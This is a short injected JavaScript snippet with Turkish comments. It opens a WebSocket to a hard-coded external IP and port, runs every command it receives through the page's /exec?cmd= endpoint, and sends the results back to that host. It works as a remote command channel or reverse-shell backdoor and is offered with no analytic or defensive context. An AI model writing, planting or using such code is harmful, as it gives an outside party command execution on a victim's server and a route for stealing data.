<script>
var host = '31.172.87.6'; // Bağlanılacak IP adresi
var port = 4545; // Bağlanılacak port numarası

var s = new WebSocket('ws://' + host + ':' + port);

s.onopen = function () {
    s.send('Bağlantı başarılı. Merhaba!');
};

s.onmessage = function (e) {
    var command = e.data;
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "/exec?cmd=" + encodeURIComponent(command), true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            s.send(xhr.responseText);
        }
    };
    xhr.send();
};
</script>
